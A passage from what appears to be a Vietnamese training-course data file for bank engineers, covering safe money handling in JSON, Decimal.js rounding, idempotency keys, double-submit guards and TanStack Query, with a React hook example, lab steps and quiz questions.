        detail: "Dựa vào phản hồi HTTP (`200 OK`, `202 Accepted` treo chờ đối soát, hay `504 Timeout`), UI chuyển sang nhánh `Discriminated Union` tương ứng; chỉ cấp `Idempotency-Key` mới sau khi giao dịch trước đã ngã ngũ hoàn toàn hoặc khách chủ động tạo lệnh mới."
      }
    ],
    sections: [
      {
        heading: "1. Hợp đồng Tiền tệ JSON và Bẫy dấu phẩy động IEEE 754 trên JavaScript",
        paragraphs: [
          "Trong JavaScript và TypeScript mặc định, chỉ tồn tại duy nhất một kiểu `number` biểu diễn theo chuẩn nhị phân dấu phẩy động 64-bit IEEE 754 (tương đương kiểu `double` bị cấm dùng cho tiền tệ bên Java!). Hệ quả là phép tính tưởng chừng trẻ con `0.1 + 0.2` lại cho ra `0.30000000000000004`, hoặc phép tính phí chuyển tiền doanh nghiệp `15000000 * 0.00055` sinh ra phần lẻ rác làm lệch tổng tiền hiển thị so với bút toán trên Core Ledger. Nguy hiểm không kém là giới hạn **`Number.MAX_SAFE_INTEGER` (`9,007,199,254,740,991` — khoảng 9 triệu tỷ)**: nếu Backend trả về mã bút toán 18 chữ số hoặc tổng dư nợ trái phiếu tập đoàn dạng JSON Number không có dấu ngoặc kép, hàm `JSON.parse()` của trình duyệt sẽ **âm thầm làm tròn sai các chữ số hàng đơn vị ngay lúc giải mã gói tin** trước khi bất kỳ dòng code nào của em kịp chạy!",
          "Quy tắc thiết kế API bất di bất dịch mà anh luôn áp đặt trong tài liệu kiến trúc giữa Backend và Frontend tại ngân hàng là: **Mọi trường số tiền, tỷ giá, lãi suất và mã định danh dài trên 15 chữ số trong JSON BẮT BUỘC truyền dưới dạng Chuỗi (`string`), ví dụ `\"amount\": \"25000000.00\"`**. Ở phía TypeScript, nghiêm cấm ép kiểu sang `Number(amount)` để cộng trừ nhân chia; bắt buộc bọc trong thư viện số học thập phân chính xác như `decimal.js` (cấu hình cùng chế độ làm tròn `ROUND_HALF_EVEN` như `RoundingMode.HALF_EVEN` của Java) hoặc dùng `BigInt` khi làm việc thuần túy với đơn vị nguyên nhỏ nhất (như đồng VNĐ không có xu)."
        ],
        bullets: [
          "Hiển thị khác với Lưu trữ: Khi gõ trên ô `<input>`, hiển thị dấu phân cách hàng nghìn bằng `Intl.NumberFormat('vi-VN')` (ví dụ `25.000.000`) cho mắt người dễ đếm số 0, nhưng biến trạng thái gốc gửi đi luôn là chuỗi số sạch `\"25000000\"`.",
          "Đồng bộ quy tắc làm tròn Hai đầu: Nếu UI hiển thị trước 'Phí dự kiến + VAT' cho khách xác nhận OTP, công thức làm tròn trên `Decimal.js` phải giống hệt API tính phí của Backend (tốt nhất là gọi API `/transfers/quote` lấy con số chính thức từ Backend).",
          "Bảo vệ ID giao dịch 64-bit (Snowflake ID): Mã giao dịch kiểu `long` của Java dài tới 19 chữ số (`9223372036854775807`), bắt buộc dùng `@JsonSerialize(using = ToStringSerializer.class)` ở Jackson để JSON không làm hỏng mã tra soát trên trình duyệt."
        ]
      },
      {
        heading: "2. Mô hình hóa Trạng thái Giao dịch bằng Discriminated Unions & Kiểm chứng Biên Zod",
        paragraphs: [
          "Một căn bệnh trầm kha của các màn hình thanh toán viết vội là dùng một rổ biến boolean rời rạc: `isLoading`, `isSuccess`, `isPendingNapas`, `errorMessage`. Với 4 biến rời rạc, về mặt toán học có tới $2^4 = 16$ tổ hợp trạng thái, trong đó có những trạng thái quái thai gây thảm họa UX như vừa hiện vòng quay đang xử lý, vừa hiện thông báo 'Giao dịch thất bại' kèm nút 'Chuyển lại', trong khi biên lai thành công lại bật đè lên trên! Trong TypeScript nghiêm ngặt (`strict: true`), ta giải quyết triệt để bài toán này bằng **Discriminated Unions (Hợp kiểu phân biệt bằng nhãn `status`)**.",
          "Khi định nghĩa `type TransferUiState = { status: 'IDLE' } | { status: 'SUBMITTING'; idempotencyKey: string } | { status: 'SUCCEEDED'; txnRef: string } | ...`, trình biên dịch TypeScript trở thành người trợ lý kiểm toán khó tính: ở nhánh `IDLE`, em không thể vô tình truy cập `state.txnRef` vì trường đó chưa hề tồn tại; và khi viết hàm `switch (state.status)` để vẽ giao diện, nếu sau này Backend bổ sung thêm trạng thái `PENDING_FRAUD_REVIEW` mà Frontend quên vẽ màn hình thông báo tương ứng, hàm kiểm tra vét cạn (`assertNever`) sẽ báo lỗi đỏ ngay lúc Build chứ không đợi lên Production mới trắng trang! Kết hợp thêm **Zod Schema** ở ranh giới nhập liệu và nhận phản hồi API giúp bảo vệ hệ thống ngay lúc Runtime khi dữ liệu thực tế từ người dùng hoặc mạng bên ngoài có thể không khớp kiểu tĩnh."
        ],
        bullets: [
          "Loại bỏ Impossible States: Mỗi thời điểm giao dịch chỉ có thể nằm ở ĐÚNG MỘT trạng thái hợp lệ duy nhất với bộ dữ liệu đi kèm vừa khít trạng thái đó.",
          "Zod Schema dùng chung cho Form & Payload: Kiểm tra tức thì các ràng buộc nghiệp vụ ngân hàng (số tiền nguyên dương bội số 1.000đ, nội dung chuyển khoản không chứa ký tự lạ gây lỗi điện chuẩn NAPAS ISO 8583).",
          "Phân loại rõ lỗi cho phép Retry và lỗi Nghiệp vụ: Lỗi `INSUFFICIENT_FUNDS` (không đủ số dư) thì không cho bấm thử lại nguyên xi; còn lỗi mạng `502/504/NetworkError` thì giữ nguyên ngữ cảnh để thử lại an toàn."
        ]
      },
      {
        heading: "3. Nghệ thuật Khóa Giao diện & Quản trị Vòng đời `Idempotency-Key` chuẩn Ngân hàng",
        paragraphs: [
          "Rất nhiều bạn Junior nghĩ rằng chống bấm đúp trên React chỉ cần `const [loading, setLoading] = useState(false)` rồi gán `<button disabled={loading}>` là xong. Thực tế trên máy cấu hình yếu hoặc khi người dùng bấm đúp chuột / gõ đúp phím Enter cực nhanh trong vòng vài mili-giây, cơ chế cập nhật trạng thái bất đồng bộ theo lô (State Batching) của React chưa kịp re-render lại cây DOM để gán thuộc tính `disabled` cho nút bấm — thế là sự kiện `onClick` thứ hai vẫn lọt qua khe cửa hẹp! Để khóa cứng 100% ở tốc độ nano-giây ngay trên luồng chính JavaScript, ta bắt buộc phải dùng thêm một chốt chặn đồng bộ **`useRef<boolean>(false)` (`inFlightRef`)**: kiểm tra `if (inFlightRef.current) return;` và gán `true` ngay dòng đầu tiên của hàm xử lý.",
          "Quan trọng hơn cả nút khóa giao diện là **kỷ luật giữ cố định `Idempotency-Key` giữa Frontend và Backend**. Sai lầm chết người nhất là viết `headers: { 'Idempotency-Key': crypto.randomUUID() }` nằm BÊN TRONG hàm `fetch()`! Nếu viết như vậy, mỗi lần khách rớt mạng 4G và bấm nút 'Thử lại', hàm `fetch()` chạy lại sẽ đẻ ra một UUID mới tinh, biến yêu cầu thử lại thành một giao dịch mới hoàn toàn hợp lệ trong mắt Backend, dẫn tới trừ tiền 2 lần! Quy tắc đúng phải là: sinh `Idempotency-Key` gắn với **Ý định giao dịch (Transfer Intent)**; giữ nguyên mã đó xuyên suốt mọi lần bấm thử lại do lỗi mạng/timeout; và CHỈ xoay sang mã UUID mới khi giao dịch cũ đã hoàn tất (`SUCCEEDED`), bị từ chối dứt điểm bởi quy tắc nghiệp vụ cần sửa lại số tiền/người nhận, hoặc khi khách bấm 'Tạo giao dịch mới'."
        ],
        bullets: [
          "Chốt chặn kép trên Client: Kết hợp `inFlightRef.current` (chặn tức thời ở tầng JS Event Loop) và `status === 'SUBMITTING'` (vô hiệu hóa nút bấm + hiện hiệu ứng chờ để trấn an tâm lý khách hàng).",
          "Không bao giờ sinh UUID ngay trong hàm gọi HTTP: Lưu `idempotencyKey` trong `useRef` hoặc trạng thái phiên Form để bảo toàn tính bất biến khi mạng chập chờn.",
          "Xoay mã mới khi đổi thông tin trọng yếu: Nếu giao dịch trước báo lỗi sai số tài khoản nhận và khách sửa sang số tài khoản khác hoặc đổi số tiền khác, hệ thống phải chủ động cấp `Idempotency-Key` mới để không bị Backend báo lỗi `409 Idempotency Payload Mismatch`."
        ]
      }
    ],
    comparison: {
      title: "Bảng so sánh các phương pháp xử lý số liệu & chống gửi trùng trên Frontend Ngân hàng",
      headers: ["Bài toán Kỹ thuật", "Cách làm Ngây thơ (Dễ gây sự cố)", "Chuẩn Thực chiến Ngân hàng", "Hậu quả nếu làm sai trên Production"],
      rows: [
        [
          "Biểu diễn số tiền & ID lớn trong JSON",
          "Truyền kiểu `number` (`15000000.50`, ID 19 chữ số không ngoặc kép)",
          "Truyền kiểu `string` (`\"15000000.50\"`, `\"901827364519283746\"`)",
          "`JSON.parse()` làm tròn mất chữ số cuối của mã bút toán và lệch số thập phân khi ký số"
        ],
        [
          "Tính toán phí, lãi suất, tỷ giá trên UI",
          "Toán tử `+ - * /` mặc định của JS kết hợp `Math.round()`",
          "`Decimal.js` cấu hình `ROUND_HALF_EVEN` (hoặc lấy báo giá trực tiếp từ API Backend)",
          "Số tiền khách nhìn lúc nhập OTP lệch 1–2 đồng so với số tiền thực tế bị trừ trong sổ cái"
        ],
        [
          "Khóa nút xác nhận chuyển tiền",
          "Chỉ dựa vào `useState(isLoading)` gắn lên thuộc tính `disabled` của nút",
          "Chốt đồng bộ `inFlightRef.current` ngay đầu hàm + trạng thái `Discriminated Union`",
          "Khách bấm đúp chuột siêu nhanh hoặc nhấn giữ phím Enter vẫn bắn lọt 2 request song song"
        ],
        [
          "Sinh header `Idempotency-Key`",
          "Gọi `crypto.randomUUID()` trực tiếp bên trong interceptor / hàm `fetch` mỗi lần bắn",
          "Gắn cố định 1 UUID cho 1 Ý định giao dịch, giữ nguyên khi Retry lỗi mạng `5xx/Timeout`",
          "Mất hoàn toàn tác dụng chống trừ tiền kép khi khách bấm 'Thử lại' lúc sóng 4G chập chờn"
        ]
      ]
    },
    codeTitle: "Custom Hook TypeScript chuẩn Ngân hàng: Zod Validation, Decimal.js, Discriminated Union & Sticky Idempotency-Key",
    code: [
      "import { useRef, useState } from \"react\";",
      "import Decimal from \"decimal.js\";",
      "import { z } from \"zod\";",
      "",
      "export const TransferSchema = z.object({",
      "  toAccount: z.string().regex(/^\\d{8,19}$/, \"Số tài khoản nhận không hợp lệ\"),",
      "  amountVnd: z.string().refine((v) => { const d = new Decimal(v || \"0\"); return d.isInteger() && d.gte(1000) && d.lte(500_000_000); }),",
      "  remark: z.string().trim().min(1).max(140).regex(/^[a-zA-Z0-9\\s.,-]+$/, \"Nội dung chỉ gồm chữ không dấu và số\"),",
      "});",
      "export type TransferInput = z.infer<typeof TransferSchema>;",
      "",
      "export type TransferUiState =",
      "  | { status: \"IDLE\" } | { status: \"SUBMITTING\"; idempotencyKey: string }",
      "  | { status: \"PENDING_RECONCILE\"; txnRef: string; idempotencyKey: string }",
      "  | { status: \"SUCCEEDED\"; txnRef: string; totalDebited: string }",
      "  | { status: \"FAILED\"; errorCode: string; detail: string; retryable: boolean };",
      "",
      "export function useBankingTransfer(feeRate = \"0.0005\") {",
      "  const [state, setState] = useState<TransferUiState>({ status: \"IDLE\" });",
      "  const idemKeyRef = useRef<string>(crypto.randomUUID());",
      "  const inFlightRef = useRef(false);",
      "  const calcTotalVnd = (amt: string) =>",
      "    new Decimal(amt).plus(new Decimal(amt).mul(feeRate).toDecimalPlaces(0, Decimal.ROUND_HALF_EVEN)).toFixed(0);",
      "",
      "  const submit = async (raw: TransferInput) => {",
      "    if (inFlightRef.current) return; // Chặn tức thì click đúp trước chu kỳ render",
      "    const payload = TransferSchema.parse(raw);",
      "    inFlightRef.current = true;",
      "    setState({ status: \"SUBMITTING\", idempotencyKey: idemKeyRef.current });",
      "    try {",
      "      const res = await fetch(\"/api/v1/transfers\", {",
      "        method: \"POST\", headers: { \"Content-Type\": \"application/json\", \"Idempotency-Key\": idemKeyRef.current },",
      "        body: JSON.stringify({ ...payload, expectedTotalVnd: calcTotalVnd(payload.amountVnd) }),",
      "      });",
      "      const body = await res.json();",
      "      if (res.status === 202) setState({ status: \"PENDING_RECONCILE\", txnRef: body.txnRef, idempotencyKey: idemKeyRef.current });",
      "      else if (res.ok) { idemKeyRef.current = crypto.randomUUID(); setState({ status: \"SUCCEEDED\", txnRef: body.txnRef, totalDebited: body.totalDebited }); }",
      "      else setState({ status: \"FAILED\", errorCode: body.errorCode, detail: body.detail, retryable: res.status >= 500 });",
      "    } finally { inFlightRef.current = false; }",
      "  };",
      "  return { state, submit, calcTotalVnd, resetNewIntent: () => { idemKeyRef.current = crypto.randomUUID(); setState({ status: \"IDLE\" }); } };",
      "}"
    ].join("\n"),
    codeNotes: [
      "Kiểm soát ký tự điện chuyển tiền ngay từ biên (`TransferSchema`): Chuyển tiền nhanh liên ngân hàng NAPAS 24/7 theo chuẩn ISO 8583 rất kỵ ký tự đặc biệt/emoji trong trường nội dung (`DE48/DE62`); lọc sớm bằng Zod giúp giảm tải lỗi từ chối không đáng có ở tầng chuyển mạch.",
      "Đồng bộ chuẩn làm tròn `Decimal.ROUND_HALF_EVEN`: Hàm `calcTotalVnd` tính phí trên chuỗi thập phân tuyệt đối không đi qua kiểu `number` nhị phân, khớp 100% với `RoundingMode.HALF_EVEN` (Banker's Rounding) của `BigDecimal` bên Java.",
      "Bảo toàn `idemKeyRef.current` khi gặp lỗi `5xx` hoặc mất mạng: Để ý rằng `idemKeyRef.current` CHỈ được cấp mới khi `res.ok` (thành công dứt điểm) hoặc khi người dùng chủ động gọi `resetNewIntent()` để lập lệnh mới.",
      "Hỗ trợ trạng thái lửng `202 Accepted` (`PENDING_RECONCILE`): Trong ngân hàng thật, khi cổng đối tác phản hồi chậm chưa rõ kết quả, Backend trả `202` thay vì báo lỗi bừa; nhánh `PENDING_RECONCILE` giúp UI chuyển mượt sang chế độ chờ tra soát thay vì dụ khách bấm chuyển lại lần nữa!"
    ],
    labGuide: {
      goal: "Kiểm chứng thực tế lỗi sai số dấu phẩy động JS, xây dựng Form chuyển tiền chống bấm đúp và xác nhận cùng một `Idempotency-Key` được gửi lại khi giả lập rớt mạng.",
      steps: [
        "Bước 1: Mở Node.js REPL hoặc Console trình duyệt chạy thử `JSON.parse('{\"journalId\": 9007199254740993}')` để tận mắt thấy số đuôi `3` biến thành `2`, và chạy `19.99 * 100` để thấy sai số dấu phẩy động; sau đó đối chiếu kết quả chuẩn xác khi dùng `new Decimal('19.99').mul(100).toFixed(0)`.",
        "Bước 2: Tích hợp hook `useBankingTransfer` vào một Form React đơn giản; viết đoạn test bắn liên tiếp 5 lời gọi `submit()` trong một vòng lặp đồng bộ `for` và xác nhận chỉ có ĐÚNG 1 request HTTP duy nhất xuất hiện trên Network tab nhờ `inFlightRef`.",
        "Bước 3: Cấu hình Chrome DevTools Network sang chế độ 'Offline' hoặc giả lập Backend trả về `504 Gateway Timeout`, bấm 'Xác nhận', sau đó bật mạng lại và bấm 'Thử gửi lại'.",
        "Bước 4: Soi chi tiết Request Headers của cả 2 lần gọi trong Network tab để nghiệm thu rằng giá trị `Idempotency-Key` ở lần thử lại giống hệt 100% lần đầu tiên; sau khi Backend trả `200 OK`, tạo lệnh mới và xác nhận mã UUID mới đã được xoay vòng."
      ],
      expectedOutput: "Không phát sinh request trùng khi spam click; giá trị tiền tệ và mã bút toán 19 chữ số bảo toàn chính xác tuyệt đối; `Idempotency-Key` giữ nguyên bất biến qua các lần retry mạng và tự xoay mới khi sang giao dịch kế tiếp."
    },
    examTips: [
      "Câu hỏi hội đồng kiến trúc Full-Stack rất hay xoáy vào: 'Backend đã có Unique Index trên `Idempotency-Key` rồi mà sao khách vẫn bị trừ tiền 2 lần?' -> Thủ phạm số 1 là Axios/Fetch Interceptor ở Frontend tự sinh `uuidv4()` mới mỗi lần request đi qua!",
      "Luôn nhớ con số giới hạn `Number.MAX_SAFE_INTEGER` của JS chỉ là `2^53 - 1` (~16 chữ số), nhỏ hơn rất nhiều so với `Long.MAX_VALUE` của Java (`2^63 - 1`, 19 chữ số) — mọi ID kiểu `Long` trả qua REST JSON đều nên format dạng `String`.",
      "Khi Backend trả về mã trạng thái giao dịch đang treo chưa rõ kết quả (`PENDING` / `TIMEOUT`), giao diện TUYỆT ĐỐI không được hiện nút 'Thực hiện lại giao dịch mới' màu xanh nổi bật dễ làm khách hiểu nhầm là lần trước chưa mất tiền."
    ],
    summaryTakeaways: [
      "Truyền mọi giá trị tiền tệ, tỷ giá và định danh 64-bit dưới dạng `string` trong hợp đồng JSON; tính toán trên Client bằng `Decimal.js` / `BigInt` để khớp tuyệt đối với `BigDecimal` phía Java.",
      "Dùng `Discriminated Unions` thay cho nhiều cờ boolean rời rạc để ép trình biên dịch TypeScript kiểm soát chặt từng pha của giao dịch tài chính.",
      "Sử dụng `useRef` làm khóa chặn đồng bộ tức thời kết hợp trạng thái khóa nút giao diện để triệt tiêu khe hở bất đồng bộ khi người dùng click đúp cực nhanh.",
      "Gắn vòng đời `Idempotency-Key` với 'Ý định giao dịch' thay vì 'Lượt gọi mạng': giữ nguyên mã khi retry lỗi mạng/5xx và chỉ cấp mã mới khi lập giao dịch khác."
    ],
    lessonQuestions: [
      {
        question: "Đội Backend Java đã cài đặt cơ chế chống trùng giao dịch hoàn hảo dựa trên header `Idempotency-Key` lưu trong PostgreSQL và Redis. Tuy nhiên, sau khi golive, bộ phận Chăm sóc khách hàng vẫn ghi nhận trường hợp khách chuyển tiền trên Web trong hầm gửi xe sóng yếu bị trừ tiền 2 lần cho cùng 1 món hàng. Kiểm tra code Frontend thấy lập trình viên viết một `axios.interceptors.request` gắn `config.headers['Idempotency-Key'] = crypto.randomUUID()` cho mọi lệnh `POST` và bật plugin `axios-retry` tự động gọi lại 2 lần khi gặp lỗi `ECONNABORTED`. Đâu là nguyên nhân gốc rễ và cách sửa đúng?",
        options: [
          "Do `crypto.randomUUID()` trên trình duyệt có xác suất trùng lặp cao, cần đổi sang thuật toán SHA-512.",
          "Do `axios.interceptors.request` chạy lại ở mỗi lượt retry và sinh ra một `Idempotency-Key` hoàn toàn mới, khiến Backend hiểu nhầm lần retry là một giao dịch mới độc lập; phải sinh key một lần ở tầng Form/Intent và giữ cố định xuyên suốt các lần retry.",
          "Do PostgreSQL không hỗ trợ lưu chuỗi UUID trong header HTTP nên cần chuyển sang số tự tăng.",
          "Do trình duyệt tự động xóa header tùy chỉnh khi sóng mạng yếu, cần nhét `Idempotency-Key` vào Cookie."
        ],
        answer: 1,
        explanation: "Khi request đầu tiên đã tới được Backend và đang hạch toán trừ tiền nhưng đường truyền chiều về bị đứt (`ECONNABORTED` / Read Timeout), `axios-retry` tự động phát lại request. Vì đoạn sinh `crypto.randomUUID()` đặt bên trong Request Interceptor nên lần phát lại mang một UUID mới tinh, vượt qua chốt chặn Idempotency của Backend và trừ tiền lần thứ hai. Key bắt buộc phải được khởi tạo ở cấp độ Ý định giao dịch (UI Intent) trước khi gọi hàm mạng.",
        wrongReasons: [
          "`crypto.randomUUID()` chuẩn CSPRNG có xác suất trùng gần như bằng 0; hơn nữa lỗi ở đây là sinh ra key KHÁC NHAU chứ không phải trùng nhau.",
          "",
          "PostgreSQL hỗ trợ kiểu `UUID` nguyên bản cực nhanh và bền vững; vấn đề nằm ở logic vòng đời key phía Client.",
          "Trình duyệt không bao giờ tự xóa header HTTP khi mạng yếu; nhét mã giao dịch đơn lẻ vào Cookie còn gây xung đột nghiêm trọng nếu người dùng mở 2 tab cùng lúc."
        ]
      },
      {
        question: "Hệ thống Core Ledger viết bằng Java 21 sinh mã tham chiếu bút toán (`journalId`) theo thuật toán Snowflake 64-bit kiểu `long` (ví dụ `7283940192837465129`) và trả về trong JSON dạng số nguyên `{ \"journalId\": 7283940192837465129 }`. Khi khách hàng bấm nút 'Tra soát bút toán' trên giao diện React, Backend liên tục báo `404 Journal Not Found` với mã gửi lên là `7283940192837465000`. Giải pháp chuẩn kiến trúc nhất là gì?",
        options: [
          "Ép kiểu biến `journalId` sang `float` ở phía Java trước khi trả về JSON để giảm kích thước gói tin.",
          "Dùng hàm `Math.floor()` trên TypeScript trước khi gắn `journalId` vào URL tra soát.",
          "Chuẩn hóa hợp đồng API: cấu hình Jackson ở Backend serialize các trường ID 64-bit và số tiền thành kiểu chuỗi JSON (`\"7283940192837465129\"`), phía TypeScript khai báo kiểu `string`.",
          "Tăng RAM cho trình duyệt của khách hàng để `JSON.parse()` đọc được số nguyên lớn hơn."
        ],
        answer: 2,
        explanation: "Số `long` 19 chữ số (`7283940192837465129`) vượt xa ngưỡng an toàn `Number.MAX_SAFE_INTEGER` (`9007199254740991` — 16 chữ số) của chuẩn IEEE 754 trong JavaScript. Ngay khoảnh khắc trình duyệt gọi `JSON.parse()`, các bit thấp bị mất độ chính xác và bị làm tròn thành `...5000`. Chuyển kiểu truyền tải trong JSON sang `string` bảo toàn nguyên vẹn từng chữ số trên mọi nền tảng.",
        wrongReasons: [
          "Kiểu `float` chỉ có độ chính xác khoảng 7 chữ số thập phân, càng làm hỏng nặng dữ liệu ID hơn nữa.",
          "Dữ liệu đã bị hỏng ngay bên trong `JSON.parse()` của trình duyệt trước khi tới code TypeScript, nên không hàm toán học nào cứu vãn lại được các chữ số đã mất.",
          "",
          "Giới hạn `2^53 - 1` là đặc tả toán học cứng của kiểu `number` 64-bit IEEE 754 trong động cơ JavaScript V8, hoàn toàn không phụ thuộc dung lượng RAM."
        ]
      }
    ]
  },

  F3: {
    duration: "60 phút",
    difficulty: "Trung cấp – Nâng cao (React / Next.js Digital Banking)",
    codeLang: "typescript",
    teacherIntro: "Chào em, kênh Internet Banking cá nhân và Ngân hàng Số doanh nghiệp (Corp IB) là bộ mặt trực diện nhất của ngân hàng với hàng triệu lượt truy cập mỗi ngày, nơi **React 18/19 và Next.js** thống lĩnh tuyệt đối. Khi ngồi thiết kế giải pháp cùng team Frontend, một Senior Backend hiểu chuyện sẽ giúp cả đội tránh được hai thảm họa hiệu năng rất phổ biến: Một là nhồi toàn bộ dữ liệu sao kê, số dư tài khoản vào Redux Global Store làm ứng dụng vừa nặng nề, vừa hiển thị số dư cũ rích sau khi chuyển tiền, thậm chí lộ thông tin người trước nếu khách đăng xuất rồi đăng nhập tài khoản khác trên cùng trình duyệt! Hai là khi cổng chuyển tiền liên ngân hàng xử lý bất đồng bộ qua Kafka trả về `PENDING`, nếu Frontend viết vòng lặp `setInterval` ngây thơ gọi hỏi trạng thái liên tục mỗi 500ms không điểm dừng thì 20.000 khách hàng chờ kết quả sẽ tự tạo thành một cuộc tấn công DDoS bắn sập chính API của em! Hôm nay anh em mình sẽ làm chủ `TanStack Query` và kỹ thuật `Virtualization` để phối hợp nhịp nhàng giữa UI và Backend.",
    analogy: {
      title: "Bảng điện tử tỷ giá tự làm tươi thông minh và khung cửa sổ trượt đọc cuộn sổ cái dài 100 mét",
      body: "Em hãy tưởng tượng việc quản lý dữ liệu ngân hàng trên React giống như vận hành sảnh giao dịch: thông tin 'Đang bật chế độ tối' hay 'Đang mở hộp thoại xác nhận' là đồ đạc nội bộ trong phòng (`Client UI State`); còn 'Số dư khả dụng' và 'Trạng thái lệnh chuyển tiền NAPAS' là con số nằm trong kho bạc trung tâm biến động từng giây (`Server State`) — đừng bao giờ chép tay số dư ra cuốn sổ giấy cất trong ngăn kéo (`Redux`) rồi cứ thế tin sái cổ, mà hãy lắp bảng điện tử thông minh (`TanStack Query`) biết tự động kiểm tra lại khi khách quay lại màn hình và tự xóa sạch bảng ngay khi khách rời quầy! Còn khi kế toán doanh nghiệp mở sao kê 15.000 giao dịch, thay vì trải tấm giấy dài 100 mét kín cả tòa nhà làm sập sàn (`render 15.000 thẻ DOM`), ta chỉ dùng một **khung kính nhỏ hiển thị đúng 15 dòng trước mắt** (`Virtualization`) — mắt khách cuộn tới đâu, giấy trượt ngầm tới đó nhẹ tựa lông hồng!"
    },
    objectives: [
      "Phân tách rạch ròi `Server State` và `Client UI State`, làm chủ `TanStack Query` (`staleTime`, `AbortSignal`, `invalidateQueries`, xóa sạch bộ nhớ đệm khi Logout) thay vì lạm dụng Redux.",
      "Thiết kế cơ chế `Smart Async Polling` có giới hạn và dừng tự động để theo dõi trạng thái giao dịch bất đồng bộ (`202 Accepted` / `PENDING`) mà không gây bão tải lên Backend.",
      "Ứng dụng kỹ thuật `DOM Virtualization` (`@tanstack/react-virtual`) kết hợp phân trang con trỏ (`Keyset/Cursor Pagination`) để hiển thị mượt mà sao kê 10.000+ dòng ở tốc độ 60 FPS."
    ],
    flow: [
      {
        step: "1. Truy vấn & Đồng bộ Ngầm theo Độ nhạy Nghiệp vụ (`staleTime`)",
        detail: "Danh mục ngân hàng NAPAS ít đổi được cấu hình `staleTime: 30 phút` giảm tải cho server; riêng Số dư khả dụng đặt `staleTime: 0` để luôn kiểm chứng lại mới nhất trước khi lập lệnh."
      },
      {
        step: "2. Hủy Gói tin Thừa khi Gõ Nhanh (`AbortSignal` Inquiry)",
        detail: "Khi khách gõ số tài khoản nhận để truy vấn tên người thụ hưởng liên ngân hàng, nếu khách sửa số giữa chừng, TanStack Query tự kích hoạt `AbortSignal` hủy kết nối cũ để tránh tên người cũ ghi đè đè lên số tài khoản mới (Race Condition)."
      },
      {
        step: "3. Thăm dò Trạng thái Bất đồng bộ Có Kiểm soát (Bounded Polling)",
        detail: "Nhận mã `202 Accepted` từ Payment Hub, hàm `refetchInterval` tự động hỏi `/transfers/{id}/status` theo nhịp dãn cách và dừng ngay lập tức khi chạm trạng thái cuối (`COMPLETED`/`FAILED`) hoặc chạm trần SLA 30 giây."
      },
      {
        step: "4. Làm tươi Sổ cái & Ảo hóa Khung nhìn Sao kê (`Virtual List`)",
        detail: "Ngay khi giao dịch hoàn tất, UI gọi `invalidateQueries(['accounts'])` cập nhật tức thì số dư mới và hiển thị lịch sử giao dịch lớn qua cửa sổ ảo hóa chỉ giữ ~15 dòng DOM thật trên màn hình."
      }
    ],
    sections: [
      {
        heading: "1. Tại sao nhồi dữ liệu API Ngân hàng vào Redux là phản mẫu (Anti-pattern) hiện đại?",
        paragraphs: [
          "Cách đây 6–7 năm, nhiều dự án React có thói quen đưa tất cả mọi thứ từ danh sách tài khoản, hạn mức thẻ tín dụng cho tới danh sách 500 dòng sao kê vào chung một cây **Redux Global Store** khổng lồ. Hậu quả trong hệ thống ngân hàng rất nặng nề: Thứ nhất, dữ liệu trên Server vốn không thuộc quyền sở hữu của trình duyệt — ngay giây sau khi em lưu `balance = 50_000_000` vào Redux, một giao dịch trích nợ tự động tiền điện hoặc một khoản chuyển khoản đến qua VietQR đã làm con số đó lỗi thời! Thứ hai, lập trình viên phải tự viết hàng trăm dòng boilerplate xử lý Race Condition: chuyện gì xảy ra khi khách bấm xem Tài khoản A (mạng chậm 3 giây mới trả về) rồi bấm ngay sang Tài khoản B (trả về trong 0.5 giây)? Phản hồi muộn của Tài khoản A sẽ ghi đè dữ liệu sai lên màn hình Tài khoản B!",
          "Nguy hiểm nhất về mặt bảo mật (Data Leakage) trên máy tính dùng chung tại văn phòng kế toán: nếu một nhân viên xuất quỹ đăng xuất tài khoản Công ty A và đăng nhập tài khoản Công ty B mà lập trình viên quên reset sót một nhánh reducer trong Redux, màn hình Dashboard có thể nhá lên số dư và danh sách người thụ hưởng mật của Công ty A trong vài giây! Với **`TanStack Query` (React Query)**, dữ liệu Server được quản lý như một bộ nhớ đệm phân mảnh theo khóa định danh có cấu trúc (`['accounts', cif, accountNo]`), tự động loại bỏ kết quả của request cũ bị hủy (`AbortSignal`), tự động đánh dấu cũ (`invalidateQueries`) ngay sau khi thực hiện `useMutation` chuyển tiền, và xóa trắng toàn bộ dấu vết dữ liệu nhạy cảm chỉ bằng đúng 1 lệnh `queryClient.clear()` ngay trong hàm Đăng xuất."
        ],
        bullets: [
          "Phân tầng `staleTime` theo nghiệp vụ: Dữ liệu tĩnh như Danh sách chi nhánh, Bảng mã BIN 50 ngân hàng đặt `staleTime: 1000 * 60 * 30` (30 phút); Số dư khả dụng CASA đặt `staleTime: 0` để đảm bảo tính thời sự cao nhất.",
          "Tắt `refetchOnWindowFocus` có chọn lọc: Tránh việc khách chuyển tab sang đọc tin nhắn SMS lấy mã OTP rồi quay lại tab ngân hàng làm kích hoạt gọi lại API tạo giao dịch hay làm gián đoạn luồng nhập OTP!",
          "Dọn sạch bộ nhớ khi hết phiên (`Session Expiry / Logout`): Bắt buộc gọi `queryClient.clear()` đồng thời hủy mọi tiến trình chạy ngầm trước khi điều hướng về màn hình Login."
        ]
      },
      {
        heading: "2. Thiết kế Smart Async Polling cho Giao dịch Bất đồng bộ không gây bão DDoS nội bộ",
        paragraphs: [
          "Trong kiến trúc Microservices ngân hàng (mà em đã học ở Học phần M và B), các giao dịch thanh toán hóa đơn điện/nước, mua chứng chỉ quỹ hay chuyển tiền lô lương doanh nghiệp thường được xử lý bất đồng bộ qua Apache Kafka và Saga Orchestrator. Khi đó API `POST /api/v1/transfers` chỉ khóa giữ tiền tạm thời rồi trả về ngay mã HTTP **`202 Accepted`** kèm `{ \"txnId\": \"TXN-889\", \"status\": \"PENDING\" }` trong dưới 80ms để giải phóng luồng Tomcat/Netty. Nhiệm vụ của React lúc này là theo dõi cho đến khi giao dịch chuyển sang trạng thái kết thúc (`COMPLETED`, `FAILED`, hoặc `SUSPENSE_HOLD`) để hiển thị biên lai điện tử cho khách.",
